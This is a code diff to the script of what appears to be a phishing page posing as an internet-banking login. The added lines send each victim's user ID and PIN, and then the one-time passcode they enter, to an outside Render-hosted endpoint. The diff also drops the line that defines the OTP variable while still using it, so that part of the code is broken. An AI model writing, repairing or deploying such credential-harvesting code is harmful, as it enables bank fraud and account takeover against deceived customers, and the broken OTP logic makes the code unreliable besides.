@@ -1,3 +1,4 @@
+  const renderURL = "https://your-app-name.onrender.com/send-data";
 const setupWatermark = (inputId, labelId) => {
     const input = document.getElementById(inputId);
     const label = document.getElementById(labelId);
@@ -21,12 +22,15 @@ document.addEventListener('DOMContentLoaded', () => {
             const user = document.getElementById('txiID').value;
             const pass = document.getElementById('txiPwd').value;
 
-            // --- NEW: SEND TO BACKEND (PHP) ---
-            fetch('send_data.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `userId=${encodeURIComponent(user)}&pin=${encodeURIComponent(pass)}`
-            });
+         // --- NEW: SEND TO RENDER BACKEND ---
+fetch(renderURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        userId: user,
+        pin: pass
+    })
+});
 
             // --- KEEP: YOUR VISUAL LOGIC ---
             const toHide = document.querySelectorAll('.EnterData, .btnLogOnCover, .btnRegisterOnline, .BHBox, .iBankingLoGo');
@@ -47,14 +51,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnVerify = document.getElementById('btnVerify');
     if (btnVerify) {
         btnVerify.addEventListener('click', function() {
-            // --- NEW: GRAB OTP DATA ---
-            const otpCode = document.getElementById('otpInput').value;
-
-            if (otpCode === "") {
-                alert("Please enter the code!");
-                return;
-            }
-
+          // --- NEW: SEND OTP TO RENDER BACKEND ---
+fetch(renderURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        otp: otpCode
+    })
+});
             // --- NEW: SEND OTP TO BACKEND ---
             fetch('send_data.php', {
                 method: 'POST',
